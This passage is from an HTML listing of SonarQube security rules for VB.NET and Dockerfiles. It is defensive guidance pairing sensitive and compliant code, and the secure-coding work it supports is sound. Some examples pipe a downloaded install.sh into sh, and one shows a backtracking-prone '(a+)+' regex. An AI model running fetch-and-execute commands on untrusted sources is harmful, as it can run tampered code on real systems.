<pre>
Dim safeAccessRule = new FileSystemAccessRule("Everyone", FileSystemRights.FullControl, AccessControlType.Deny)

Dim fileInfo = new FileInfo("path")
Dim fileSecurity = fileInfo.GetAccessControl()
fileSecurity.SetAccessRule(safeAccessRule)
fileInfo.SetAccessControl(fileSecurity)
</pre>
<p>.Net / .Net Core using Mono.Posix.NETStandard</p>
<pre>
Dim fs = UnixFileSystemInfo.GetFileSystemEntry("path")
fs.FileAccessPermissions = FileAccessPermissions.UserExecute
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/">Top 10 2021 Category A1 - Broken Access Control</a> </li>
  <li> OWASP - <a href="https://owasp.org/Top10/A04_2021-Insecure_Design/">Top 10 2021 Category A4 - Insecure Design</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control">Top 10 2017 Category A5 - Broken Access Control</a>
  </li>
  <li> <a
  href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/09-Test_File_Permission">OWASP File Permission</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/732">CWE-732 - Incorrect Permission Assignment for Critical Resource</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/266">CWE-266 - Incorrect Privilege Assignment</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=vbnet:S3884">
              vbnet:S3884
            </a>
          </td>
          <td>
            <details>
              <p>This rule is deprecated, and will eventually be removed.</p>
<h2>Why is this an issue?</h2>
<p><code>CoSetProxyBlanket</code> and <code>CoInitializeSecurity</code> both work to set the permissions context in which the process invoked
immediately after is executed. Calling them from within that process is useless because it’s too late at that point; the permissions context has
already been set.</p>
<p>Specifically, these methods are meant to be called from non-managed code such as a C++ wrapper that then invokes the managed, i.e. C# or VB.NET,
code.</p>
<h3>Noncompliant code example</h3>
<pre>
Public Class Noncompliant

    &lt;DllImport("ole32.dll")&gt;
    Public Shared Function CoSetProxyBlanket(&lt;MarshalAs(UnmanagedType.IUnknown)&gt;pProxy As Object, dwAuthnSvc as UInt32, dwAuthzSvc As UInt32, &lt;MarshalAs(UnmanagedType.LPWStr)&gt; pServerPrincName As String, dwAuthnLevel As UInt32, dwImpLevel As UInt32, pAuthInfo As IntPtr, dwCapabilities As UInt32) As Integer
    End Function

    Public Enum RpcAuthnLevel
        [Default] = 0
        None = 1
        Connect = 2
        [Call] = 3
        Pkt = 4
        PktIntegrity = 5
        PktPrivacy = 6
    End Enum

    Public Enum RpcImpLevel
        [Default] = 0
        Anonymous = 1
        Identify = 2
        Impersonate = 3
        [Delegate] = 4
    End Enum

    Public Enum EoAuthnCap
        None = &amp;H00
        MutualAuth = &amp;H01
        StaticCloaking = &amp;H20
        DynamicCloaking = &amp;H40
        AnyAuthority = &amp;H80
        MakeFullSIC = &amp;H100
        [Default] = &amp;H800
        SecureRefs = &amp;H02
        AccessControl = &amp;H04
        AppID = &amp;H08
        Dynamic = &amp;H10
        RequireFullSIC = &amp;H200
        AutoImpersonate = &amp;H400
        NoCustomMarshal = &amp;H2000
        DisableAAA = &amp;H1000
    End Enum

    &lt;DllImport("ole32.dll")&gt;
    Public Shared Function CoInitializeSecurity(pVoid As IntPtr, cAuthSvc As Integer, asAuthSvc As IntPtr, pReserved1 As IntPtr, level As RpcAuthnLevel, impers As RpcImpLevel, pAuthList As IntPtr, dwCapabilities As EoAuthnCap, pReserved3 As IntPtr) As Integer
    End Function

    Public Sub DoSomething()
        Dim Hres1 As Integer = CoSetProxyBlanket(Nothing, 0, 0, Nothing, 0, 0, IntPtr.Zero, 0) ' Noncompliant
        Dim Hres2 As Integer = CoInitializeSecurity(IntPtr.Zero, -1, IntPtr.Zero, IntPtr.Zero, RpcAuthnLevel.None, RpcImpLevel.Impersonate, IntPtr.Zero, EoAuthnCap.None, IntPtr.Zero) ' Noncompliant
    End Sub

End Class
</pre>
<h2>Resources</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/">Top 10 2021 Category A1 - Broken Access Control</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration">Top 10 2017 Category A6 - Security
  Misconfiguration</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/648">CWE-648 - Incorrect Use of Privileged APIs</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=vbnet:S1313">
              vbnet:S1313
            </a>
          </td>
          <td>
            <details>
              <p>Hardcoding IP addresses is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-5901">CVE-2006-5901</a> </li>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-3725">CVE-2005-3725</a> </li>
</ul>
<p>Today’s services have an ever-changing architecture due to their scaling and redundancy needs. It is a mistake to think that a service will always
have the same IP address. When it does change, the hardcoded IP will have to be modified too. This will have an impact on the product development,
delivery, and deployment:</p>
<ul>
  <li> The developers will have to do a rapid fix every time this happens, instead of having an operation team change a configuration file. </li>
  <li> It misleads to use the same address in every environment (dev, sys, qa, prod). </li>
</ul>
<p>Last but not least it has an effect on application security. Attackers might be able to decompile the code and thereby discover a potentially
sensitive address. They can perform a Denial of Service attack on the service, try to get access to the system, or try to spoof the IP address to
bypass security checks. Such attacks can always be possible, but in the case of a hardcoded IP address solving the issue will take more time, which
will increase an attack’s impact.</p>
<h2>Ask Yourself Whether</h2>
<p>The disclosed IP address is sensitive, e.g.:</p>
<ul>
  <li> Can give information to an attacker about the network topology. </li>
  <li> It’s a personal (assigned to an identifiable person) IP address. </li>
</ul>
<p>There is a risk if you answered yes to any of these questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Don’t hard-code the IP address in the source code, instead make it configurable with environment variables, configuration files, or a similar
approach. Alternatively, if confidentially is not required a domain name can be used since it allows to change the destination quickly without having
to rebuild the software.</p>
<h2>Sensitive Code Example</h2>
<pre>
Dim ip = "192.168.12.42" ' Sensitive
Dim address = IPAddress.Parse(ip)
</pre>
<h2>Compliant Solution</h2>
<pre>
Dim ip = ConfigurationManager.AppSettings("myapplication.ip") ' Compliant
Dim address = IPAddress.Parse(ip)
</pre>
<h2>Exceptions</h2>
<p>No issue is reported for the following cases because they are not considered sensitive:</p>
<ul>
  <li> Loopback addresses 127.0.0.0/8 in CIDR notation (from 127.0.0.0 to 127.255.255.255) </li>
  <li> Broadcast address 255.255.255.255 </li>
  <li> Non-routable address 0.0.0.0 </li>
  <li> Strings of the form <code>2.5.&lt;number&gt;.&lt;number&gt;</code> as they <a href="http://www.oid-info.com/introduction.htm">often match
  Object Identifiers</a> (OID) </li>
  <li> Addresses in the ranges 192.0.2.0/24, 198.51.100.0/24, 203.0.113.0/24, reserved for documentation purposes by <a
  href="https://datatracker.ietf.org/doc/html/rfc5737">RFC 5737</a> </li>
  <li> Addresses in the range 2001:db8::/32, reserved for documentation purposes by <a href="https://datatracker.ietf.org/doc/html/rfc3849">RFC
  3849</a> </li>
</ul>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/">Top 10 2021 Category A1 - Broken Access Control</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=vbnet:S6444">
              vbnet:S6444
            </a>
          </td>
          <td>
            <details>
              <p>Not specifying a timeout for regular expressions can lead to a Denial-of-Service attack. Pass a timeout when using
<code>System.Text.RegularExpressions</code> to process untrusted input because a malicious user might craft a value for which the evaluation lasts
excessively long.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> the input passed to the regular expression is untrusted. </li>
  <li> the regular expression contains patterns vulnerable to <a href="https://www.regular-expressions.info/catastrophic.html">catastrophic
  backtracking</a>. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> It is recommended to specify a <a
  href="https://learn.microsoft.com/dotnet/standard/base-types/best-practices#use-time-out-values"><code>matchTimeout</code></a> when executing a
  regular expression. </li>
  <li> Make sure regular expressions are not vulnerable to Denial-of-Service attacks by reviewing the patterns. </li>
  <li> Consider using a non-backtracking algorithm by specifying <a
  href="https://learn.microsoft.com/dotnet/api/system.text.regularexpressions.regexoptions?view=net-7.0"><code>RegexOptions.NonBacktracking</code></a>. </li>
</ul>
<h2>Sensitive Code Example</h2>
<pre>
Public Sub RegexPattern(Input As String)
    Dim EmailPattern As New Regex(".+@.+", RegexOptions.None)
    Dim IsNumber as Boolean = Regex.IsMatch(Input, "[0-9]+")
    Dim IsLetterA as Boolean = Regex.IsMatch(Input, "(a+)+")
End Sub
</pre>
<h2>Compliant Solution</h2>
<pre>
Public Sub RegexPattern(Input As String)
    Dim EmailPattern As New Regex(".+@.+", RegexOptions.None, TimeSpan.FromMilliseconds(100))
    Dim IsNumber as Boolean = Regex.IsMatch(Input, "[0-9]+", RegexOptions.None, TimeSpan.FromMilliseconds(100))
    Dim IsLetterA As Boolean = Regex.IsMatch(Input, "(a+)+", RegexOptions.NonBacktracking) '.Net 7 And above
    AppDomain.CurrentDomain.SetData("REGEX_DEFAULT_MATCH_TIMEOUT", TimeSpan.FromMilliseconds(100)) 'process-wide setting
End Sub
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection">Top 10 2017 Category A1 - Injection</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/400">CWE-400 - Uncontrolled Resource Consumption</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/1333">CWE-1333 - Inefficient Regular Expression Complexity</a> </li>
  <li> <a href="https://www.regular-expressions.info/catastrophic.html">regular-expressions.info</a> - Runaway Regular Expressions: Catastrophic
  Backtracking </li>
  <li> <a href="https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS">owasp.org</a> - Regular expression Denial of
  Service - ReDoS </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/1333">CWE-1333 - Inefficient Regular Expression Complexity</a> </li>
  <li> <a href="https://docs.microsoft.com/dotnet/standard/base-types/best-practices">docs.microsoft.com</a> - Best practices for regular expressions
  in .NET </li>
  <li> <a href="https://docs.microsoft.com/dotnet/standard/base-types/backtracking-in-regular-expressions">docs.microsoft.com</a> - Backtracking in
  Regular Expressions </li>
  <li> <a
  href="https://devblogs.microsoft.com/dotnet/regular-expression-improvements-in-dotnet-7/#backtracking-and-regexoptions-nonbacktracking">devblogs.microsoft.com</a> - Regular Expression Improvements in .NET 7: Backtracking (and RegexOptions.NonBacktracking) </li>
  <li> <a href="https://docs.microsoft.com/dotnet/api/system.text.regularexpressions.regex.matchtimeout">docs.microsoft.com</a> - Regex.MatchTimeout
  Property </li>
  <li> <a href="https://docs.microsoft.com/dotnet/api/system.text.regularexpressions.regexoptions?view=net-7.0">docs.microsoft.com</a> - RegexOptions
  Enum (NonBacktracking option) </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=vbnet:S4036">
              vbnet:S4036
            </a>
          </td>
          <td>
            <details>
              <p>When executing an OS command and unless you specify the full path to the executable, then the locations in your application’s <code>PATH</code>
environment variable will be searched for the executable. That search could leave an opening for an attacker if one of the elements in
<code>PATH</code> is a directory under his control.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The directories in the PATH environment variable may be defined by not trusted entities. </li>
</ul>
<p>There is a risk if you answered yes to this question.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Fully qualified/absolute path should be used to specify the OS command to execute.</p>
<h2>Sensitive Code Example</h2>
<pre>
Dim p As New Process()
p.StartInfo.FileName = "binary" ' Sensitive
</pre>
<h2>Compliant Solution</h2>
<pre>
Dim p As New Process()
p.StartInfo.FileName = "C:\Apps\binary.exe" ' Compliant
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/">Top 10 2021 Category A8 - Software and Data Integrity
  Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection">Top 10 2017 Category A1 - Injection</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/426">CWE-426 - Untrusted Search Path</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/427">CWE-427 - Uncontrolled Search Path Element</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=docker:S6502">
              docker:S6502
            </a>
          </td>
          <td>
            <details>
              <p>Disabling builder sandboxes can lead to unauthorized access of the host system by malicious programs.</p>
<p>By default, programs executed by a <code>RUN</code> statement use only a subset of <a
href="https://man7.org/linux/man-pages/man7/capabilities.7.html">capabilities</a> which are considered safe: this is called <code>sandbox</code>
mode.</p>
<p>If you disable the sandbox with the <code>--security=insecure</code> option, the executed command can use the full set of Linux capabilities.<br>
This can lead to a container escape. For example, an attacker with the <code>SYS_ADMIN</code> capability is able to mount devices from the host
system.</p>
<p>This vulnerability allows an attacker who controls the behavior of the ran command to access the host system, break out of the container and
penetrate the infrastructure.</p>
<p>After a successful intrusion, the underlying systems are exposed to:</p>
<ul>
  <li> theft of intellectual property and/or personal data </li>
  <li> extortion </li>
  <li> denial of service </li>
</ul>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The program is controlled by an external entity. </li>
  <li> The program is part of a supply chain that could be a victim of a supply chain attack. </li>
</ul>
<p>There is a risk if you answered yes to either of these questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Whenever possible, the sandbox should stay enabled to reduce unnecessary risk. </li>
  <li> If elevated capabilities are absolutely necessary, make sure to verify the integrity of the program before executing it. </li>
</ul>
<h2>Sensitive Code Example</h2>
<pre>
# syntax=docker/dockerfile:1-labs
FROM ubuntu:22.04
# Sensitive
RUN --security=insecure ./example.sh
</pre>
<h2>Compliant Solution</h2>
<pre>
# syntax=docker/dockerfile:1-labs
FROM ubuntu:22.04
RUN ./example.sh
RUN --security=sandbox ./example.sh
</pre>
<h2>See</h2>
<ul>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/250">CWE-250 - Execution with Unnecessary Privileges</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/284">CWE-284 - Improper Access Control</a> </li>
  <li> <a href="https://docs.docker.com/engine/reference/builder/#run---security">Dockerfile reference</a> - RUN </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=docker:S6505">
              docker:S6505
            </a>
          </td>
          <td>
            <details>
              <p>When installing dependencies, package managers like <code>npm</code> will automatically execute shell scripts distributed along with the source
code. Post-install scripts, for example, are a common way to execute malicious code at install time whenever a package is compromised.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The execution of dependency installation scripts is required for the application to function correctly. </li>
</ul>
<p>There is a risk if you answered no to the question.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Execution of third-party scripts should be disabled if not strictly necessary for dependencies to work correctly. Doing this will reduce the attack
surface and block a well-known supply chain attack vector.</p>
<p>Commands that are subject to this issue are: <code>npm install</code>, <code>yarn install</code> and <code>yarn</code> (<code>yarn</code> without
an explicit command will execute <code>install</code>).</p>
<h2>Sensitive Code Example</h2>
<pre data-diff-id="1" data-diff-type="noncompliant">
FROM node:latest

# Sensitive
RUN npm install
</pre>
<pre data-diff-id="2" data-diff-type="noncompliant">
FROM node:latest

# Sensitive
RUN yarn install
</pre>
<h2>Compliant Solution</h2>
<pre data-diff-id="1" data-diff-type="compliant">
FROM node:latest

RUN npm install --ignore-scripts
</pre>
<pre data-diff-id="2" data-diff-type="compliant">
FROM node:latest

RUN yarn install --ignore-scripts
</pre>
<h2>See</h2>
<ul>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/506">CWE-506 - Embedded Malicious Code</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/829">CWE-829 - Inclusion of Functionality from Untrusted Control Sphere</a> </li>
  <li> <a href="https://eslint.org/blog/2018/07/postmortem-for-malicious-package-publishes/">ESLint blog</a> - Postmortem for Malicious Packages
  Published on July 12th, 2018 </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=docker:S5332">
              docker:S5332
            </a>
          </td>
          <td>
            <details>
              <p>Clear-text protocols such as <code>ftp</code>, <code>telnet</code>, or <code>http</code> lack encryption of transported data, as well as the
capability to build an authenticated connection. It means that an attacker able to sniff traffic from the network can read, modify, or corrupt the
transported content. These protocols are not secure as they expose applications to an extensive range of risks:</p>
<ul>
  <li> sensitive data exposure </li>
  <li> traffic redirected to a malicious endpoint </li>
  <li> malware-infected software update or installer </li>
  <li> execution of client-side code </li>
  <li> corruption of critical information </li>
</ul>
<p>Even in the context of isolated networks like offline environments or segmented cloud environments, the insider threat exists. Thus, attacks
involving communications being sniffed or tampered with can still happen.</p>
<p>For example, attackers could successfully compromise prior security layers by:</p>
<ul>
  <li> bypassing isolation mechanisms </li>
  <li> compromising a component of the network </li>
  <li> getting the credentials of an internal IAM account (either from a service account or an actual person) </li>
</ul>
<p>In such cases, encrypting communications would decrease the chances of attackers to successfully leak data or steal credentials from other network
components. By layering various security practices (segmentation and encryption, for example), the application will follow the
<em>defense-in-depth</em> principle.</p>
<p>Note that using the <code>http</code> protocol is being deprecated by <a
href="https://blog.mozilla.org/security/2015/04/30/deprecating-non-secure-http">major web browsers</a>.</p>
<p>In the past, it has led to the following vulnerabilities:</p>
<ul>
  <li> <a href="https://nvd.nist.gov/vuln/detail/CVE-2019-6169">CVE-2019-6169</a> </li>
  <li> <a href="https://nvd.nist.gov/vuln/detail/CVE-2019-12327">CVE-2019-12327</a> </li>
  <li> <a href="https://nvd.nist.gov/vuln/detail/CVE-2019-11065">CVE-2019-11065</a> </li>
</ul>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> Application data needs to be protected against tampering or leaks when transiting over the network. </li>
  <li> Application data transits over an untrusted network. </li>
  <li> Compliance rules require the service to encrypt data in transit. </li>
  <li> OS-level protections against clear-text traffic are deactivated. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Make application data transit over a secure, authenticated and encrypted protocol like TLS or SSH. Here are a few alternatives to the most
  common clear-text protocols:
    <ul>
      <li> Use <code>sftp</code>, <code>scp</code>, or <code>ftps</code> instead of <code>ftp</code>. </li>
      <li> Use <code>https</code> instead of <code>http</code>. </li>
    </ul>  </li>
</ul>
<p>It is recommended to secure all transport channels, even on local networks, as it can take a single non-secure connection to compromise an entire
application or system.</p>
<h2>Sensitive Code Example</h2>
<pre>
RUN curl http://www.example.com/
</pre>
<h2>Compliant Solution</h2>
<pre>
RUN curl https://www.example.com/
</pre>
<h2>See</h2>
<ul>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/200">CWE-200 - Exposure of Sensitive Information to an Unauthorized Actor</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/319">CWE-319 - Cleartext Transmission of Sensitive Information</a> </li>
  <li> <a href="https://security.googleblog.com/2016/09/moving-towards-more-secure-web.html">Google, Moving towards more secure web</a> </li>
  <li> <a href="https://blog.mozilla.org/security/2015/04/30/deprecating-non-secure-http/">Mozilla, Deprecating non secure http</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=docker:S6506">
              docker:S6506
            </a>
          </td>
          <td>
            <details>
              <p>The usage of HTTPS is not enforced here. As it is possible for the HTTP client to follow redirects, such redirects might lead to websites using
HTTP.</p>
<p>As HTTP is a clear-text protocol, it is considered insecure. Due to its lack of encryption, attackers that are able to sniff traffic from the
network can read, modify, or corrupt the transported content. Therefore, allowing redirects to HTTP can lead to several risks:</p>
<ul>
  <li> Exposure of sensitive data </li>
  <li> Malware-infected software updates or installers </li>
  <li> Corruption of critical information </li>
</ul>
<p>Even in isolated networks, such as segmented cloud or offline environments, it is important to ensure the usage of HTTPS. If not, then insider
threats with access to these environments might still be able to monitor or tamper with communications.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> It is possible for the requested resource to be redirected to an insecure location in the future. </li>
</ul>
<p>There is a risk if you answered yes to the question.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Ensure that the HTTP client only accepts HTTPS pages. In <code>curl</code> this can be enabled using the option <code>--proto "=https"</code>.
  </li>
  <li> If it is not necessary to follow HTTP redirects, disable this in the HTTP client. In <code>curl</code> this is done by omitting the
  <code>-L</code> or <code>--location</code> option. In <code>wget</code> this is done by adding the option <code>--max-redirect=0</code>. </li>
</ul>
<h2>Sensitive Code Example</h2>
<p>In the examples below, an install script is downloaded using <code>curl</code> or <code>wget</code> and then executed.</p>
<p>While connections made using HTTPS are generally considered secure, <code>https://might-redirect.example.com/install.sh</code> might redirect to a
location that uses HTTP. Downloads made using HTTP are not secure and can be intercepted and modified. An attacker could modify the install script to
run malicious code inside the container.</p>
<p><code>curl</code> will not follow redirects unless either <code>-L</code> or <code>--location</code> option is used.</p>
<pre data-diff-id="1" data-diff-type="noncompliant">
FROM ubuntu:22.04

# Sensitive
RUN curl --tlsv1.2 -sSf -L https://might-redirect.example.com/install.sh | sh
</pre>
<p><code>wget</code> will follow redirects by default.</p>
<pre data-diff-id="2" data-diff-type="noncompliant">
FROM ubuntu:22.04

# Sensitive
RUN wget --secure-protocol=TLSv1_2 -q -O - https://might-redirect.example.com/install.sh | sh
</pre>
<h2>Compliant Solution</h2>
<p>If you expect the server to redirect the download to a new location, <code>curl</code> can use the option <code>--proto "=https"</code> to ensure
requests are only made using HTTPS. Any attempt to redirect to a location using HTTP will result in an error.</p>
<pre data-diff-id="1" data-diff-type="compliant">
FROM ubuntu:22.04

RUN curl --proto "=https" --tlsv1.2 -sSf -L https://might-redirect.example.com/install.sh | sh
</pre>
<p><code>wget</code> does not support this functionality so <code>curl</code> should be used instead.</p>
<p>If you expect the server to return the file without redirects, <code>curl</code> should not be instructed to follow redirects. Remove any
<code>-L</code> or <code>--location</code> options from the command.</p>
<pre>
FROM ubuntu:22.04

RUN curl --tlsv1.2 -sSf https://might-redirect.example.com/install.sh | sh
</pre>
<p><code>wget</code> uses the option <code>--max-redirect=0</code> to disable redirects.</p>
<pre data-diff-id="2" data-diff-type="compliant">
FROM ubuntu:22.04

RUN wget --secure-protocol=TLSv1_2 --max-redirect=0 -q -O - https://might-redirect.example.com/install.sh | sh
</pre>
<h2>See</h2>
<ul>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/757">CWE-757 - Selection of Less-Secure Algorithm During Negotiation ('Algorithm
  Downgrade')</a> </li>
  <li> <a href="https://curl.se/docs/manpage.html#--proto">curl.1 the man page</a> - <code>--proto &lt;protocols&gt;</code> </li>
  <li> <a href="https://www.gnu.org/software/wget/manual/wget.html#HTTP-Options">wget - GNU Wget Manual</a> - <code>--max-redirect=</code> </li>
  <li> <a href="https://github.com/ssllabs/research/wiki/SSL-and-TLS-Deployment-Best-Practices#41-encrypt-everything">SSL and TLS Deployment Best
  Practices</a> - Encrypt Everything </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=docker:S4507">
              docker:S4507
            </a>
          </td>
          <td>
            <details>
              <p>Development tools and frameworks usually have options to make debugging easier for developers. Although these features are useful during
development, they should never be enabled for applications deployed in production. Debug instructions or error messages can leak detailed information
about the system, like the application’s path or file names.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The code or configuration enabling the application debug features is deployed on production servers or distributed to end users. </li>
  <li> The application runs by default with debug features activated. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Do not enable debugging features on production servers or applications distributed to end users.</p>
<h2>Sensitive Code Example</h2>
<pre>
FROM example
# Sensitive
ENV APP_DEBUG=true
# Sensitive
ENV ENV=development
CMD /run.sh
</pre>
<h2>Compliant Solution</h2>
<pre>
FROM example
ENV APP_DEBUG=false
ENV ENV=production
CMD /run.sh
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/489">CWE-489 - Active Debug Code</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/215">CWE-215 - Information Exposure Through Debug Information</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=docker:S6437">
              docker:S6437
            </a>
          </td>
          <td>
            <details>
              <p>Secret leaks often occur when a sensitive piece of authentication data is stored with the source code of an application. Considering the source
code is intended to be deployed across multiple assets, including source code repositories or application hosting servers, the secrets might get
exposed to an unintended audience.</p>
<h2>Why is this an issue?</h2>
<p>In most cases, trust boundaries are violated when a secret is exposed in a source code repository or an uncontrolled deployment environment.
Unintended people who don’t need to know the secret might get access to it. They might then be able to use it to gain unwanted access to associated
services or resources.</p>
<p>The trust issue can be more or less severe depending on the people’s role and entitlement.</p>
<p>In Dockerfiles, hard-coded secrets and secrets passed through as variables or created at build-time will cause security risks. The secret
information can be exposed either via the container environment, the image metadata, or the build environment logs.</p>
<h3>What is the potential impact?</h3>
<p>The consequences vary greatly depending on the situation and the secret-exposed audience. Still, two main scenarios should be considered.</p>
<h4>Financial loss</h4>
<p>Financial losses can occur when a secret is used to access a paid third-party-provided service and is disclosed as part of the source code of
client applications. Having the secret, each user of the application will be able to use it without limit to use the third party service to their own
need, including in a way that was not expected.</p>
<p>This additional use of the secret will lead to added costs with the service provider.</p>
<p>Moreover, when rate or volume limiting is set up on the provider side, this additional use can prevent the regular operation of the affected
application. This might result in a partial denial of service for all the application’s users.</p>
<h4>Application’s security downgrade</h4>
<p>A downgrade can happen when the disclosed secret is used to protect security-sensitive assets or features of the application. Depending on the
affected asset or feature, the practical impact can range from a sensitive information leak to a complete takeover of the application, its hosting
server or another linked component.</p>
<p>For example, an application that would disclose a secret used to sign user authentication tokens would be at risk of user identity impersonation.
An attacker accessing the leaked secret could sign session tokens for arbitrary users and take over their privileges and entitlements.</p>
<h2>How to fix it</h2>
<p>Best practices recommend using a secret vault for all secrets that must be accessed at container runtime. This will ensure the secret’s security
and prevent any further unexpected disclosure. Depending on the development platform and the leaked secret type, multiple solutions are currently
available.</p>
<p>For all secrets that must be accessed at image build time, it is recommended to rely on Docker Buildkit’s secret mount options. This will prevent
secrets from being disclosed in image’s metadata and build logs.</p>
<p>Additionally, investigations and remediation actions should be conducted to ensure the current and future security of the infrastructure.</p>
<p><strong>Revoke the secret</strong></p>
<p>Revoke any leaked secrets and remove them from the application source code.</p>
<p>Before revoking the secret, ensure that no other applications or processes are using it. Other usages of the secret will also be impacted when the
secret is revoked.</p>
<p><strong>Analyze recent secret use</strong></p>
<p>When available, analyze authentication logs to identify any unintended or malicious use of the secret since its disclosure date. Doing this will
allow determining if an attacker took advantage of the leaked secret and to what extent.</p>
<p>This operation should be part of a global incident response process.</p>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<p>The following code sample generates a new SSH private key that will be stored in the generated image. This key should be considered as compromised.
Moreover, the SSH key encryption passphrase is also hardcoded.</p>
<pre data-diff-id="1" data-diff-type="noncompliant">
FROM example

# Noncompliant
RUN ssh-keygen -N "passphrase" -t rsa -b 2048 -f /etc/ssh/rsa_key

RUN /example.sh --ssh /etc/ssh/rsa_key
</pre>
<p>The following code sample uses a seemingly hidden password which is actually leaked in the image metadata after the build.</p>
<pre data-diff-id="2" data-diff-type="noncompliant">
FROM example
ARG PASSWORD

# Noncompliant
RUN wget --user=guest --password="$PASSWORD" https://example.com
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
FROM example

RUN --mount=type=secret,id=ssh,target=/etc/ssh/rsa_key \
    /example.sh --ssh /etc/ssh/rsa_key
</pre>
<pre data-diff-id="2" data-diff-type="compliant">
FROM example

RUN --mount=type=secret,id=wget,target=/home/user/.wgetrc \
    wget --user=guest https://example.com
</pre>
<p>For runtime secrets, best practices recommend relying on a vault service to pass secret information to the containers. Docker environment provides
Swarm services that implement such a feature.</p>
<p>If such an option can not be considered, store the runtime secrets in an <a href="https://docs.docker.com/compose/env-file/">environment file</a>
such as <code>.env</code> and then start the container with the <a
href="https://docs.docker.com/engine/reference/commandline/run/#env"><code>--env-file</code></a> argument:</p>
<pre>
docker run --env-file .env myImage
</pre>
<p>It is then important to ensure that the environment files are securely stored and generated.</p>
<h2>Resources</h2>
<h3>Documentation</h3>
<ul>
